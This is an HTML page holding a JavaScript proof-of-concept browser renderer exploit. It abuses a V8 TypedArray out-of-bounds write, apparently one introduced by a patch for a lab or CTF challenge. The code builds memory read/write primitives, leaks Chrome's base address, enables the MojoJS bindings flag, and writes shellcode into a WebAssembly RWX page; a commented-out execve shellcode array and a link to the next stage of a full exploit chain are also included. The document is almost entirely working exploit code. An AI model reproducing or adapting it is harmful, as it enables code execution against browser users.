<!DOCTYPE html>

<html>

    <body>

        <script>

// This POC exploits the out-of-bounds write introduced by v8_bug.patch in TypedArrayPrototypeSetTypedArray

// to enable mojo javascript bindings in the main browser process.

/**

 * Utils

 */

let conversion_buffer = new ArrayBuffer(8);

let float_view = new Float64Array(conversion_buffer);

let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {

    return '0x' + this.toString(16);

};

BigInt.prototype.i2f = function() {

    int_view[0] = this;

    return float_view[0];

}

Number.prototype.f2i = function() {

    float_view[0] = this;

    return int_view[0];

}



/**

 * Exploit

 */

function pwn()

{

    function make_primitives() {

        let y = new Uint32Array(1);

        let x = new Uint32Array(1);



        // we overwrite the length field of array z

        // to achieve out-of-bounds read

        let z = [1.1, 1.1, 1.1, 1.1];



        // this array will store objects for the

        // addrof primitive

        let arr_addrof = [{}];

        // this array is used to leak the high pointer

        // since it contains a full address

        let f_arr = new Float64Array(1);



        // copy 0x8888 into y

        // this is the array length size

        y.set([0x8888], 0);

	/*

	FIXME:

	If you get the console log

	   "[+] z.length = 4" and the error [1111/084949.241642:INFO:CONSOLE(58)] "Uncaught TypeError: Cannot read property 'f2i' of undefined", try changing the offset to 32

	*/

        // copy y into offset 33 which will

        // be the length field of array z. we overwrite

        // it with a large value like 0x8888 so we can

        // now perform out-of-bounds read.

        x.set(y, 33);

        console.log("[+] z.length = " + z.length);

        return [z, arr_addrof, f_arr];

    }



    let [z, arr_addrof, f_arr] = make_primitives();

    let heap_upper = z[28].f2i() & 0xffffffff00000000n;

    console.log("[+] heap_upper = " + heap_upper.hex());

    // we save the original TypedArray object's pointer

    // to restore it at the end and make the garbage

    // collector happy.

    let original_28 = z[28];

    let original_29 = z[29];



    function addrof(obj) {

        arr_addrof[0] = obj;

        // we use the out-of-bounds read from array z

        // to leak the address of our target object

        // stored in arr_addrof

        return (z[7].f2i() & 0xffffffffn) - 1n;

    }

    function aar64(addr) {

        // overwrite 32-bits of the pointer

        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();

        // overwrite the next 32-bits of the pointer

        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();

        // arbitrary address read using the full pointer

        // we overwrote in the TypedArray object.

        return f_arr[0].f2i();

    }

    function aaw64(addr, value) {

        // overwrite 32-bits of the pointer

        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();

        // overwrite the next 32-bits of the pointer

        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();

        // arbitrary address write using the full pointer

        // we overwrote in the TypedArray object.

        f_arr[0] = value.i2f();

    }

    function get_wasm_func() {

        const wasm_simple = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b]; 

        let wasm_buffer = new ArrayBuffer(wasm_simple.length); 

        let wasm_func = null; 

        const wasm_buf = new Uint8Array(wasm_buffer); 



        for (let i = 0; i < wasm_simple.length; ++i) { 

            wasm_buf[i] = wasm_simple[i]; 

        }



        let importObject = { 

            imports: { 

                imported_func: () => { 

                    print("[$] wasm imported"); 

                } 

            } 

        } 

 

        let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_buf), importObject); 

        return [wasm_mod, wasm_mod.exports.exported_func]; 

    }

    function cleanup() {

        // restore the original TypedArray object's

        // pointer to make the garbage collector happy.

        z[28] = original_28;

        z[29] = original_29;

    }



    /* Leak chrome base. 

    * Use the high pointer leak and the addrof primitive to obtain the address of the div object.

    * Pass the address to the arbitrary-address-read to obtain a chrome memory address.

    * Subtract the offset of the memory address to compute the chrome base address.

    */

    let div = document.createElement('div');

    let addr_div = heap_upper | addrof(div);

    console.log("[+] addr_div = " + addr_div.hex());

    let addr_HTMLDivElement = aar64(addr_div + 0xCn);

    console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());

    let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;

    console.log("[+] chrome_base = " + chrome_base.hex());



    /* Enable MojoJS 

    * Add the offset for the mojo variable to the leaked chrome base.

    * Use the arbitrary-address-write to flip the bits in the flag.

    */

    console.log("[+] Overwriting flags..");

    let addr_flag_MojoJS = chrome_base + 0xc560f0en;

    aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);



    let flag = aar64(addr_flag_MojoJS & 0xfffffffffffffff8n);

console.log(flag);



    console.log("[+] Getting wasm page");

    let [ wasm_mod, wasm_page ] = get_wasm_func();

    let rwx_pp = heap_upper | addrof(wasm_mod) + 0x30n;

    console.log("[+] wasm obj => " + rwx_pp.hex());



    let rwx_p = aar64(rwx_pp); //  & 0xfffffffffffffff8n);

    console.log("[+] rwx ptr = " + rwx_p.hex());

    let rwx_map = aar64(rwx_p); //  & 0xfffffffffffffff8n);

    //let rwx_base = rwx_map - 1600n;

    console.log("[+] rwx memory = " + rwx_map.hex());

    //console.log("[+] rwx base = " + rwx_base.hex());



    //console.log("writing rwx ptr with the rwx base address to extend shellcode limit")

    // 4096 bytes

    //aaw64(rwx_p, rwx_base);



    //aaw64(rwx_map & 0xfffffffffffffff8n, BigInt(4276879083)); // original opcodes



    let shellcode = [ 4276879083 ]; // infinite loop

    //let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

	function copy_shellcode(addr, shellcode) {

	    let buf = new ArrayBuffer(0x100);

	    let dataview = new DataView(buf);

	    let buf_addr = heap_upper | addrof(buf);

	    let backing_store_addr = buf_addr + 0x20n; // 0x60n;



	    console.log("buf_addr = " + buf_addr.hex());

	    console.log("overwriting backing store " + backing_store_addr.hex());

	    console.log(" with addr = " + BigInt(addr).hex());

	    aaw64(backing_store_addr, BigInt(addr));



	    for (let i = 0; i < shellcode.length; i++) {

	        console.log("writing " + BigInt(shellcode[i]).hex());

		while (true) {

		dataview.setUint32(4*i, shellcode[i], true);

		};

	    }

	}



    copy_shellcode(rwx_map, shellcode);



    console.log("[+] Wrote shellcode, launching wasm " + shellcode.length);



    wasm_page();



    /* Cleanup */

    console.log("[+] Cleaning up");

    cleanup();





    // Reload the web-page to execute the next stage of the full-chain-exploit.

    //window.location.href = "./2-browser-exploit.html";

}



console.log("[+] Renderer exploit!");

pwn();

        </script>

    </body>

</html>
